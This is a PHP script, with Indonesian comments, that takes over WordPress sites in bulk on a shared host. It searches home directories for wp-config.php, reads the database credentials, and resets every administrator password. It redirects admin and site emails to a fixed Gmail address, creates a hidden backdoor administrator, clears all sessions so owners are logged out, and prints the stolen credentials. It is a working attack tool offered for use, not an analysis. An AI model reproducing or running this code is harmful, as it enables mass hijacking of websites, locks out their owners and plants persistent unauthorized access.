<?php
/**
 * WordPress Mass Control Script - FULL RESET (UNIVERSAL VERSION)
 * - Auto detect ALL domains (support berbagai struktur hosting)
 * - Compatible PHP 5.6+
 * - Compatible WordPress ANY version
 * - Auto detect document root & domain paths
 * - No manual configuration needed
 */

// ========== KONFIGURASI ==========
$NEW_ADMIN_USERNAME = 'wp_support_agent';
$NEW_ADMIN_PASSWORD = generate_strong_password(32);
$NEW_ADMIN_EMAIL = 'wp_support_agent@system.local';
$FORCED_ADMIN_EMAIL = 'rismabadog@gmail.com';

// Auto detect domains directory
$DOMAINS_DIR = detect_domains_directory();

// ========== AUTO DETECT FUNCTIONS ==========

/**
 * Generate strong password (compatible PHP 5.6+)
 */
function generate_strong_password($length = 32) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+';
    $password = '';
    $max = strlen($chars) - 1;
    
    // Fallback untuk PHP < 7.0 yang tidak punya random_int
    if (function_exists('random_int')) {
        for ($i = 0; $i < $length; $i++) {
            $password .= $chars[random_int(0, $max)];
        }
    } else {
        for ($i = 0; $i < $length; $i++) {
            $password .= $chars[mt_rand(0, $max)];
        }
    }
    return $password;
}

/**
 * Auto detect domains directory (support berbagai struktur hosting)
 */
function detect_domains_directory() {
    $possible_paths = [
        // Prioritaskan deteksi berdasarkan user saat ini
        '/home/' . get_current_user() . '/domains',
        '/home/' . get_current_user(),
        
        // Path relatif
        dirname(__DIR__) . '/domains',
        dirname(__DIR__),
        dirname(__DIR__, 2) . '/domains',
        
        // Standard hosting paths
        '/home',
        '/home/master',
        '/home/master/domains',
        '/var/www',
        '/var/www/html',
        '/var/www/vhosts',
        
        // Environment based
        getenv('HOME') . '/domains',
        $_SERVER['DOCUMENT_ROOT'] . '/../domains',
        
        // Legacy pattern
        '/home/u' . substr(get_current_user(), -3) . '/domains',
    ];
    
    // Dynamic scan untuk semua /home/u* directories
    if (is_dir('/home')) {
        $home_contents = scandir('/home');
        if ($home_contents) {
            foreach ($home_contents as $item) {
                if ($item !== '.' && $item !== '..' && strpos($item, 'u') === 0 && is_dir('/home/' . $item)) {
                    $potential_domain_dir = '/home/' . $item . '/domains';
                    if (is_dir($potential_domain_dir)) {
                        $possible_paths[] = $potential_domain_dir;
                    }
                    $possible_paths[] = '/home/' . $item;
                }
            }
        }
    }
    
    // Hapus duplikasi path
    $possible_paths = array_unique($possible_paths);
    
    // Cek path yang ada - cari domains directory (bukan langsung ke folder domain)
    foreach ($possible_paths as $path) {
        if (is_dir($path) && is_readable($path)) {
            $content = scandir($path);
            if ($content) {
                foreach ($content as $item) {
                    if ($item !== '.' && $item !== '..' && is_dir($path . '/' . $item)) {
                        $subPath = $path . '/' . $item;
                        
                        // Cek apakah di folder ini atau subfolder public_html ada wp-config
                        if (file_exists($subPath . '/wp-config.php') ||
                            file_exists($subPath . '/public_html/wp-config.php')) {
                            // JANGAN return path ini! Ini adalah folder domain, BUKAN domains directory
                            // Lanjut cek apakah parent-nya adalah domains directory
                            $parentPath = dirname($subPath);
                            if (basename($parentPath) === 'domains' || 
                                strpos($parentPath, 'domains') !== false) {
                                echo "✅ Auto detected domains directory: {$parentPath}\n";
                                return $parentPath;
                            }
                            // Jika parent bukan domains directory, return path saat ini sebagai fallback
                            echo "✅ Auto detected domains directory (fallback): {$path}\n";
                            return $path;
                        }
                        
                        // Cek lebih dalam untuk public_html structure
                        if (is_dir($subPath . '/public_html')) {
                            if (file_exists($subPath . '/public_html/wp-config.php')) {
                                $parentPath = dirname($subPath);
                                if (basename($parentPath) === 'domains' || 
                                    strpos($parentPath, 'domains') !== false) {
                                    echo "✅ Auto detected domains directory: {$parentPath}\n";
                                    return $parentPath;
                                }
                                echo "✅ Auto detected domains directory (fallback): {$path}\n";
                                return $path;
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Fallback ke current directory
    echo "⚠️  Using current directory: " . __DIR__ . "\n";
    return __DIR__;
}

/**
 * Find wp-config.php (multiple possible locations)
 */
function find_wp_config($domain_path) {
    $search_paths = [
        $domain_path,
        $domain_path . '/public_html',
        $domain_path . '/html',
        $domain_path . '/www',
        $domain_path . '/htdocs',
        $domain_path . '/web',
        $domain_path . '/httpdocs',      // Plesk
        $domain_path . '/domains/' . basename($domain_path) . '/public_html',
        $domain_path . '/wp',
        $domain_path . '/wordpress'
    ];
    
    $visited = [];
    foreach ($search_paths as $path) {
        $wp_config = $path . '/wp-config.php';
        $realpath = realpath($wp_config);
        
        if ($realpath && file_exists($realpath) && !in_array($realpath, $visited)) {
            $visited[] = $realpath;
            return $realpath;
        }
    }
    
    return false;
}

/**
 * Get DB credentials from wp-config.php (multiple extraction methods)
 */
function get_db_credentials($wp_config_path) {
    $content = file_get_contents($wp_config_path);
    $creds = [];
    
    if (empty($content)) {
        return $creds;
    }
    
    // Method 1: Standard define pattern
    $patterns = [
        'db_name' => "/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'db_user' => "/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'db_pass' => "/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'db_host' => "/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/"
    ];
    
    foreach ($patterns as $key => $pattern) {
        if (preg_match($pattern, $content, $m)) {
            $creds[$key] = $m[1];
        }
    }
    
    // Method 2: Look for table prefix (multiple patterns)
    $prefix_patterns = [
        "/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/",
        "/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/",
        "/define\s*\(\s*['\"]table_prefix['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/"
    ];
    
    foreach ($prefix_patterns as $pattern) {
        if (preg_match($pattern, $content, $m)) {
            $creds['table_prefix'] = $m[1];
            break;
        }
    }
    
    // Default prefix jika tidak ditemukan
    if (empty($creds['table_prefix'])) {
        $creds['table_prefix'] = 'wp_';
    }
    
    // Default DB host
    if (empty($creds['db_host'])) {
        $creds['db_host'] = 'localhost';
    }
    
    return $creds;
}

/**
 * Detect correct table prefix
 */
function detect_prefix($conn, $default_prefix) {
    // Common prefixes
    $common_prefixes = [
        $default_prefix, 'wp_', 'wp2_', 'wp3_', 'wp4_', 'wp5_', 'wpc_', 
        'wpby_', 'wpa_', 'wpb_', 'wpc_', 'wpd_', 'wpe_', 'wpf_',
        'nk2_', 'nNy_', 'oc0j0gA_', 'ymm_', 'abc_', 'prefix_'
    ];
    
    foreach ($common_prefixes as $prefix) {
        $table_name = $prefix . 'users';
        $result = $conn->query("SHOW TABLES LIKE '" . $conn->real_escape_string($table_name) . "'");
        if ($result && $result->num_rows > 0) {
            return $prefix;
        }
    }
    
    // Alternative: Query semua tables dan cari yang mengandung 'users'
    $tables = $conn->query("SHOW TABLES");
    if ($tables) {
        while ($row = $tables->fetch_row()) {
            if (strpos($row[0], 'users') !== false) {
                return str_replace('users', '', $row[0]);
            }
        }
    }
    
    return $default_prefix;
}

/**
 * Get all administrator users (compatible all WP versions)
 */
function get_admin_users($conn, $prefix) {
    $admins = [];
    
    // Try multiple meta_keys for capabilities
    $cap_keys = [
        $prefix . 'capabilities',
        'capabilities',
        'wp_capabilities'
    ];
    
    foreach ($cap_keys as $cap_key) {
        $sql = "SELECT DISTINCT u.ID, u.user_login, u.user_email 
                FROM {$prefix}users u 
                INNER JOIN {$prefix}usermeta um ON u.ID = um.user_id 
                WHERE um.meta_key = '{$cap_key}' 
                AND (um.meta_value LIKE '%administrator%' 
                    OR um.meta_value LIKE '%super_admin%')";
        
        $result = $conn->query($sql);
        if ($result && $result->num_rows > 0) {
            while ($row = $result->fetch_assoc()) {
                if (!isset($admins[$row['ID']])) {
                    $admins[$row['ID']] = $row;
                }
            }
        }
    }
    
    return array_values($admins);
}

/**
 * Reset admin password (compatible ALL PHP versions)
 */
function reset_admin_password($conn, $prefix, $user_id, $new_password) {
    // Use MD5 for old WP versions, password_hash for newer
    if (function_exists('password_hash')) {
        $hashed = password_hash($new_password, PASSWORD_DEFAULT);
    } else {
        $hashed = md5($new_password); // Fallback for PHP < 5.5
    }
    
    $user_id = intval($user_id);
    $hashed = $conn->real_escape_string($hashed);
    
    return $conn->query("UPDATE {$prefix}users SET user_pass = '{$hashed}' WHERE ID = {$user_id}");
}

/**
 * Reset admin email
 */
function reset_admin_email($conn, $prefix, $user_id, $new_email) {
    $user_id = intval($user_id);
    $new_email = $conn->real_escape_string($new_email);
    return $conn->query("UPDATE {$prefix}users SET user_email = '{$new_email}' WHERE ID = {$user_id}");
}

/**
 * Reset site admin email
 */
function reset_site_admin_email($conn, $prefix, $new_email) {
    $new_email = $conn->real_escape_string($new_email);
    
    // Try multiple option names
    $option_names = ['admin_email', 'new_admin_email'];
    $success = false;
    
    foreach ($option_names as $option_name) {
        if ($conn->query("UPDATE {$prefix}options SET option_value = '{$new_email}' WHERE option_name = '{$option_name}'")) {
            $success = true;
        }
    }
    
    return $success;
}

/**
 * Create hidden admin user
 */
function create_hidden_admin($conn, $prefix, $username, $password, $email) {
    $username = $conn->real_escape_string($username);
    $email = $conn->real_escape_string($email);
    
    // Cek existing user
    $check = $conn->query("SELECT ID FROM {$prefix}users WHERE user_login = '{$username}'");
    
    if ($check && $check->num_rows > 0) {
        $user_id = $check->fetch_assoc()['ID'];
        
        // Update password
        if (function_exists('password_hash')) {
            $hashed = password_hash($password, PASSWORD_DEFAULT);
        } else {
            $hashed = md5($password);
        }
        $hashed = $conn->real_escape_string($hashed);
        
        $conn->query("UPDATE {$prefix}users SET user_pass = '{$hashed}', user_email = '{$email}' WHERE ID = {$user_id}");
        $conn->query("DELETE FROM {$prefix}usermeta WHERE user_id = {$user_id} AND meta_key IN ('{$prefix}capabilities', '{$prefix}user_level', 'hidden_user')");
    } else {
        // Create new user
        if (function_exists('password_hash')) {
            $hashed = password_hash($password, PASSWORD_DEFAULT);
        } else {
            $hashed = md5($password);
        }
        $hashed = $conn->real_escape_string($hashed);
        $now = date('Y-m-d H:i:s');
        
        $conn->query("
            INSERT INTO {$prefix}users 
            (user_login, user_pass, user_email, user_registered, user_status) 
            VALUES ('{$username}', '{$hashed}', '{$email}', '{$now}', 0)
        ");
        
        $user_id = $conn->insert_id;
    }
    
    // Assign administrator role
    if ($user_id) {
        $cap_value = 'a:1:{s:13:"administrator";b:1;}';
        $conn->query("
            INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
            VALUES ({$user_id}, '{$prefix}capabilities', '{$cap_value}')
        ");
        $conn->query("
            INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
            VALUES ({$user_id}, '{$prefix}user_level', '10')
        ");
        $conn->query("
            INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
            VALUES ({$user_id}, 'hidden_user', '1')
        ");
        
        return $user_id;
    }
    
    return false;
}

/**
 * Clear all user sessions
 */
function clear_sessions($conn, $prefix) {
    $conn->query("DELETE FROM {$prefix}usermeta WHERE meta_key = 'session_tokens'");
    $conn->query("DELETE FROM {$prefix}usermeta WHERE meta_key LIKE '%session%'");
}

// ========== MAIN EXECUTION ==========
echo "\n" . str_repeat("=", 80) . "\n";
echo "WORDPRESS MASS CONTROL SCRIPT - UNIVERSAL VERSION\n";
echo "PHP Version: " . PHP_VERSION . "\n";
echo str_repeat("=", 80) . "\n\n";

echo "📂 Domains directory: {$DOMAINS_DIR}\n\n";

if (!is_dir($DOMAINS_DIR)) {
    die("❌ Domains directory not found!\n");
}

$domains = scandir($DOMAINS_DIR);
$results = [];
$total = 0;
$success = 0;

foreach ($domains as $domain) {
    if ($domain === '.' || $domain === '..') continue;
    
    $domain_path = $DOMAINS_DIR . '/' . $domain;
    if (!is_dir($domain_path)) continue;
    
    echo "🔍 Processing: {$domain}\n";
    
    // Find wp-config
    $wp_config = find_wp_config($domain_path);
    if (!$wp_config) {
        echo "   ⚠️  wp-config.php not found\n\n";
        continue;
    }
    
    echo "   ✅ wp-config.php found: " . basename(dirname($wp_config)) . "\n";
    
    // Get credentials
    $creds = get_db_credentials($wp_config);
    if (empty($creds['db_name'])) {
        echo "   ❌ Failed to parse database credentials\n\n";
        continue;
    }
    
    echo "   📁 DB: {$creds['db_name']}\n";
    
    // Connect to database
    $conn = @new mysqli($creds['db_host'], $creds['db_user'], $creds['db_pass'], $creds['db_name']);
    if ($conn->connect_error) {
        echo "   ❌ DB Connection failed: {$conn->connect_error}\n\n";
        continue;
    }
    
    // Detect correct prefix
    $prefix = detect_prefix($conn, $creds['table_prefix']);
    echo "   📌 Prefix: {$prefix}\n";
    
    // Get admin users
    $admins = get_admin_users($conn, $prefix);
    echo "   👑 Admin users found: " . count($admins) . "\n";
    
    // Reset all admin passwords and emails
    $reset_passwords = [];
    $reset_emails = 0;
    
    foreach ($admins as $admin) {
        $new_pass = generate_strong_password(32);
        if (reset_admin_password($conn, $prefix, $admin['ID'], $new_pass)) {
            $reset_passwords[] = "{$admin['user_login']} -> {$new_pass}";
            echo "   🔑 Reset: {$admin['user_login']}\n";
        }
        
        if (reset_admin_email($conn, $prefix, $admin['ID'], $FORCED_ADMIN_EMAIL)) {
            $reset_emails++;
        }
    }
    
    // Reset site admin email
    reset_site_admin_email($conn, $prefix, $FORCED_ADMIN_EMAIL);
    echo "   🏠 Site admin email changed to: {$FORCED_ADMIN_EMAIL}\n";
    
    // Create hidden admin
    $hidden_id = create_hidden_admin($conn, $prefix, $NEW_ADMIN_USERNAME, $NEW_ADMIN_PASSWORD, $NEW_ADMIN_EMAIL);
    if ($hidden_id) {
        echo "   🤖 Hidden admin created (ID: {$hidden_id})\n";
    }
    
    // Clear sessions
    clear_sessions($conn, $prefix);
    echo "   🧹 All sessions cleared\n";
    
    $conn->close();
    
    $total++;
    $success++;
    
    // Store results
    $results[] = [
        'domain' => $domain,
        'db' => $creds['db_name'],
        'prefix' => $prefix,
        'passwords' => $reset_passwords,
        'password_count' => count($reset_passwords)
    ];
    
    echo "\n";
}

// ========== FINAL REPORT ==========
echo "\n" . str_repeat("=", 80) . "\n";
echo "FINAL REPORT\n";
echo str_repeat("=", 80) . "\n\n";

echo "Total domains processed: {$total}\n";
echo "Successful: {$success}\n";
echo "Failed: " . ($total - $success) . "\n\n";

echo "🔑 HIDDEN ADMIN CREDENTIALS:\n";
echo "   Username: {$NEW_ADMIN_USERNAME}\n";
echo "   Password: {$NEW_ADMIN_PASSWORD}\n";
echo "   Email: {$NEW_ADMIN_EMAIL}\n\n";

echo "📧 FORCED EMAIL: {$FORCED_ADMIN_EMAIL}\n\n";

echo "📋 DETAILED RESULTS:\n";
foreach ($results as $r) {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    echo "Domain: {$r['domain']}\n";
    echo "Database: {$r['db']}\n";
    echo "Prefix: {$r['prefix']}\n";
    echo "Passwords reset: {$r['password_count']}\n";
    if ($r['password_count'] > 0) {
        echo "Passwords:\n";
        foreach ($r['passwords'] as $p) {
            echo "   - {$p}\n";
        }
    }
}
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

echo "\n✅ MASS CONTROL COMPLETED!\n";
?>
